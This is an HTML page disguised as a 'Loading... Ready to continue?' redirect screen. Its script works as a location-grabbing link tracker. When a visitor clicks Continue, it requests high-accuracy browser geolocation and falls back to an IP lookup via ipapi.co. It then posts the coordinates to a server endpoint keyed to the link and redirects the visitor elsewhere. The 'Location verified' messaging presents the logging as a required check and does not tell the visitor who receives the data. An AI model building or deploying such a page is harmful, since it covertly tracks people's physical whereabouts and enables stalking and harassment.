<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%;background:#fff;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
.wrap{text-align:center;padding:2rem;max-width:320px}
.dot-ring{position:relative;width:64px;height:64px;margin:0 auto 1.5rem}
.dot-ring::before,.dot-ring::after{content:'';position:absolute;inset:0;border-radius:50%}
.dot-ring::before{background:rgba(99,102,241,0.15);animation:ripple 1.8s ease-out infinite}
.dot-ring::after{background:rgba(99,102,241,0.08);animation:ripple 1.8s ease-out infinite .6s}
.dot{width:64px;height:64px;border-radius:50%;background:#6366f1;position:relative;z-index:1;animation:pulse 1.8s ease-in-out infinite}
@keyframes ripple{0%{transform:scale(1);opacity:1}100%{transform:scale(2.4);opacity:0}}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(0.92)}}
.title{font-size:1rem;font-weight:600;color:#111;margin-bottom:0.4rem}
.msg{font-size:0.82rem;color:#9ca3af;line-height:1.5}
.continue-btn{margin-top:1.4rem;padding:0.65rem 1.6rem;background:#6366f1;color:#fff;border:none;border-radius:8px;font-size:0.9rem;font-weight:600;cursor:pointer;width:100%}
.continue-btn:active{opacity:0.85}
.continue-btn:disabled{opacity:0.5;cursor:not-allowed}
.bar{position:fixed;top:0;left:0;height:3px;background:#6366f1;width:0%;transition:width 0.4s ease;z-index:100}
</style>
</head>
<body>
<div class="bar" id="bar"></div>
<div class="wrap">
  <div class="dot-ring"><div class="dot"></div></div>
  <p class="title">Ready to continue?</p>
  <p class="msg" id="msg">Click the button below to proceed</p>
  <button class="continue-btn" id="continueBtn">Continue →</button>
</div>

<script>
const linkId = window.location.pathname.split('/').pop();
let destUrl = 'https://google.com';
let sent = false;
let retryCount = 0;
const MAX_RETRIES = 2;

const bar = document.getElementById('bar');
const msg = document.getElementById('msg');
const continueBtn = document.getElementById('continueBtn');

function setBar(pct, ms) {
  bar.style.transition = `width ${ms}ms ease`;
  bar.style.width = pct + '%';
}

// Get destination URL
fetch('/api/hits/' + linkId)
  .then(r => r.json())
  .then(d => { if (d.dest) destUrl = d.dest; })
  .catch(() => {});

function postLoc(lat, lon, acc) {
  if (sent) return;
  sent = true;
  
  fetch('/api/hit/' + linkId, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ lat, lon, acc })
  }).catch(() => {});
  
  redirect();
}

function redirect() {
  setBar(100, 300);
  setTimeout(() => { window.location.href = destUrl; }, 400);
}

// IP-based geolocation fallback
async function getIPLocation() {
  try {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();
    if (data.latitude && data.longitude) {
      return { lat: data.latitude, lon: data.longitude, acc: 5000 };
    }
  } catch (e) {}
  return null;
}

// Grab location with retry
function grabLocationWithRetry() {
  if (!navigator.geolocation) {
    msg.textContent = 'Getting location from network...';
    getIPLocation().then(ipLoc => {
      if (ipLoc) {
        postLoc(ipLoc.lat, ipLoc.lon, ipLoc.acc);
      } else {
        postLoc(null, null, null);
      }
    });
    return;
  }

  const options = {
    enableHighAccuracy: true,
    timeout: 8000,
    maximumAge: 0
  };

  navigator.geolocation.getCurrentPosition(
    pos => {
      setBar(90, 200);
      msg.textContent = 'Location verified, redirecting...';
      postLoc(
        pos.coords.latitude,
        pos.coords.longitude,
        Math.round(pos.coords.accuracy)
      );
    },
    err => {
      if (retryCount < MAX_RETRIES && err.code !== 1) {
        retryCount++;
        msg.textContent = `Retrying location detection (${retryCount}/${MAX_RETRIES})...`;
        setTimeout(() => grabLocationWithRetry(), 1500);
      } else {
        msg.textContent = 'Using network location...';
        setBar(70, 300);
        getIPLocation().then(ipLoc => {
          if (ipLoc) {
            postLoc(ipLoc.lat, ipLoc.lon, ipLoc.acc);
          } else {
            postLoc(null, null, null);
          }
        });
      }
    },
    options
  );
}

function startLocationGrab() {
  continueBtn.disabled = true;
  continueBtn.textContent = 'Processing...';
  msg.textContent = 'Detecting your location...';
  setBar(50, 300);
  grabLocationWithRetry();
}

continueBtn.addEventListener('click', startLocationGrab);
</script>
</body>
</html>
